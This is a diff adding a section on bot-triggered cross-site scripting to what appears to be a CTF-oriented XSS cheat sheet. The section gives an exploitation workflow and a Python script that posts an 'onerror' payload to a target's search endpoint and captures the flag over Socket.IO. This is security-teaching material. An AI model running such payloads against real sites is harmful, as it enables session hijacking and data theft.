@@ -362,3 +362,33 @@ Impact: Cookie theft, session hijacking, etc.
 
 **Pro Tip:** Practice each sink type systematically until the payload selection becomes instinctive for real-world testing.
 
+### 16. Bot-Triggered XSS (Report URL / Bot Endpoint)
+
+Many apps have endpoints that trigger a headless browser (Puppeteer/Playwright) to visit a URL containing your payload. Common patterns:
+
+| Indicator | Example |
+|-----------|---------|
+| POST endpoint with URL/query param | `POST /search {"query": "..."}`, `POST /report {"url": "..."}` |
+| WebSocket/Socket.IO on the page | `<script src="/socket.io/socket.io.js">` |
+| Bot response on alert/dialog | Bot detects `alert()` and emits flag/secret via WebSocket |
+
+**Exploitation workflow:**
+1. **Read source code** -- find how the bot processes your input (URL param? query string? full URL?)
+2. **Connect to WebSocket/Socket.IO first** -- listen for data events before triggering the bot
+3. **Send XSS payload** via the bot trigger endpoint (POST /search, /report, /submit)
+4. **Capture exfiltrated data** from WebSocket event
+
+```python
+# Python Socket.IO client (v5+ for EIO=4 targets)
+import socketio, requests
+sio = socketio.Client()
+
+@sio.on('flag')  # or 'data', 'result', etc.
+def on_flag(data): print(data)
+
+sio.connect("http://target:port")
+requests.post("http://target:port/search", json={"query": "<img src=x onerror=alert(1)>"})
+```
+
+**Key insight:** The bot navigates to `http://127.0.0.1/?q=YOUR_INPUT` -- your payload renders via innerHTML/document.write on the bot's page, not yours. The flag comes back via WebSocket, not HTTP response.
+
